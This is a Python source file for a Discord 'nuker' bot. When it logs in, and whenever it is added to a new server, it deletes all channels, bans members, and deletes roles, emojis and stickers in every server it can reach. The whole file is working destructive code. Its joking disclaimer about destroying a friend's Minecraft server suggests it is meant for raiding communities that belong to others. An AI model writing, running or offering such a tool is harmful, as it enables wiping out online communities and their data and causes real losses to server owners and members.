import discord

if input("This bot will delete all channels, ban all members, delete all roles, and delete all emojis and stickers in all servers it is in. Are you sure you want to continue? (y/n): ").lower() != "y":
    exit()

print("Let me ask you again")

if input("This bot will delete all channels, ban all members, delete all roles, and delete all emojis and stickers in all servers it is in. Are you sure you want to continue? (y/n): ").lower() != "y":
    exit()

print("Alright, I'm not responsible for your friends minecraft server discord being destroyed")

token = input("Enter your bot token: ")

intents = discord.Intents.default()
intents.members = True

client = discord.Client(intents=intents)

async def process_guild(guild):
    bot_member = guild.get_member(guild.me.id)

    if bot_member.guild_permissions.manage_channels:
        for channel in guild.channels:
            try:
                print(f"Deleting {channel.name}...")
                await channel.delete()
                print(f"Deleted {channel.name}.")
            except Exception as e:
                print(f"Failed to delete {channel.name}: {e}")
    else:
        print("Bot lacks permission to delete channels.")

    if bot_member.guild_permissions.ban_members:
        for member in guild.members:
            try:
                if member.top_role.position < bot_member.top_role.position:
                    try:
                        print(f"Banning {member.name}...")
                        await member.ban()
                        print(f"Banned {member.name}.")
                    except Exception as e:
                        print(f"Failed to ban {member.name}: {e}")
                else:
                    print(f"Cannot ban {member.name} due to role hierarchy.")
            except Exception as e:
                print(f"Failed to ban {member.name}: {e}")
    else:
        print("Bot lacks permission to ban members.")

    if bot_member.guild_permissions.manage_roles:
        for role in guild.roles:
            try:
                if role.position < bot_member.top_role.position:
                    try:
                        print(f"Deleting role {role.name}...")
                        await role.delete()
                        print(f"Deleted role {role.name}.")
                    except Exception as e:
                        print(f"Failed to delete role {role.name}: {e}")
                else:
                    print(f"Cannot delete {role.name} due to role hierarchy.")
            except Exception as e:
                print(f"Failed to delete role {role.name}: {e}")
    else:
        print("Bot lacks permission to manage roles.")

    if bot_member.guild_permissions.manage_emojis_and_stickers:
        for emoji in guild.emojis:
            try:
                print(f"Deleting emoji {emoji.name}...")
                await emoji.delete()
                print(f"Deleted emoji {emoji.name}.")
            except Exception as e:
                print(f"Failed to delete emoji {emoji.name}: {e}")
        for sticker in guild.stickers:
            try:
                print(f"Deleting sticker {sticker.name}...")
                await sticker.delete()
                print(f"Deleted sticker {sticker.name}.")
            except Exception as e:
                print(f"Failed to delete sticker {sticker.name}: {e}")
    else:
        print("Bot lacks permission to manage emojis and stickers.")

@client.event
async def on_ready():
    print(f"Logged in as {client.user}")

    for guild in client.guilds:
        print(f"Nuking {guild.name}...")
        await process_guild(guild)

@client.event
async def on_guild_join(guild):
    print(f"Added to a new server, nuking it ({guild.name})...")

    await process_guild(guild)

client.run(token)